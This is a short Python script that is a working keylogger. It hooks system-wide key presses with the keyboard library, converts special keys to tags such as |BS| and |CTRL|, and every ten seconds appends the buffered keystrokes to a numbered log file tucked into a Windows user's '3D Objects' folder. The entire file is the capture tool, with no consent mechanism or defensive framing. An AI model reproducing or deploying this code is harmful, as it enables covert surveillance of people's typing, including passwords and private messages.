import time, keyboard, os
start_time = time.time()
buff = ''
n=0
while True:
    if os.path.exists(f'C:\\Users\\DELL\\3D Objects\\logs{n}.txt'):
        n+=1
    else:
        path = f'C:\\Users\\DELL\\3D Objects\\logs{n}.txt'
        break
while True:
    try:
        while True:
            event = keyboard.read_event()    
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name
                key1 = key
                match key:
                    case "space":
                        key1 = " "
                    case "backspace":
                        key1 = "|BS|"
                    case "right ctrl":
                        key1 = "|CTRL|"
                    case "right alt":
                        key1 = "|ALT|"
                    case "shift":
                        key1 = ""
                    case "right shift":
                        key1 = ""
                    case "caps lock":
                        key1 = "|CL|"
                    case _:
                        if len(key)>1:
                            key1 = f'|{key.upper()}|'
                buff += key1
                elapsed_time = time.time() - start_time
                if elapsed_time >= 10.0:
                    start_time = time.time()
                    with open(path, 'a') as f:
                        f.write(buff)
                        buff = ''
    except:
        print("error")
    time.sleep(1)


